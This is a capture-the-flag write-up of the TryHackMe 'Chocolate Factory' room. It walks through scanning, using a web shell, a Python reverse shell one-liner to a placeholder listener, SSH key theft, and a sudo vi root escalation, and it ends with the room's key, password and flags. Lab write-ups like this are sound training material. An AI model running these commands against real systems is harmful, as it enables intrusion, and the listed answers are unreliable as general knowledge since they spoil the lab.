---
title: TryHackMe - Boot2Root - Chocolate Factory
date: '2024-03-20'
tags: ['ctf', 'tryhackme', 'boot2root', 'writeup', 'steghide']
draft: false
summary: An easy room with web shell available. 
---

## Challenge Description

A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

## Solution
Starting off with an `nmap` scan:

```python
nmap -sS -sV -oN nmap.log $IP
```

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled.png)

**`http`**, **`ssh`** and **`ftp`** is running. Lets have a look at the web page.

Its a login page:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled1.png)

Before doing anything crazy, let’s gather information about its directories.

I am using **`gobuster`** for it:

```python
gobuster dir -u $IP -w /opt/directory-list-2.3-medium.txt -x php,sh,cgi,html,css,tar,php,js,py,txt | tee gobuster.log
```

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled2.png)

I found a Web shell on **`/home.php`**:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled3.png)

Let’s spawn a reverse shell to local machine. But first, lets check if python is installed or not.

And it is installed:

```bash
python3 --version
```

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled4.png)

I opened a port to listen for reverse shell on my local machine:

```bash
nc -lnvp 9999
```

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled5.png)

*I used this python reverse shell one-liner:*

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local-ip>",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled6.png)

I founded these files:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled7.png)

From **`key_rev_key`** , I got the key:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled8.png)

And got charlie’s web page password from **`validate.php`**:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled9.png)

And I also found the `ssh` key of charlie from its home directory:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled10.png)

Copy it, set appropriate permissions and submit (No password is required):

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled11.png)

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled12.png)

Upon checking charlie’s sudo permission, we can clearly see that we can run vi as root:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled13.png)

I used this command to get a root shell:

```
sudo -u#0 /usr/bin/vi -c ':!/bin/bash'
```

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled14.png)

Now to get root flag, I went to root’s home directory and found a python file named **`root.py`** and upon running it, it asks for the key:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled15.png)

I entered the key that I got earlier an here is the flag:

![Screenshot](/static/writeups/tryhackme/chocolate-factory/Untitled16.png)

---

**Question/Answers:**

1. Enter the key you found!
    
    ```
    b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
    ```
    
2. What is Charlie's password?
    
    ```
    cn7824
    ```
    
3. change user to charlie
    
    ```
    NO ANSWER NEEDED
    ```
    
4. Enter the user flag
    
    ```
    flag{cd5509042371b34e4826e4838b522d2e}
    ```
    
5. Enter the root flag
    
    ```
    flag{cec59161d338fef787fcb4e296b42124}
    ```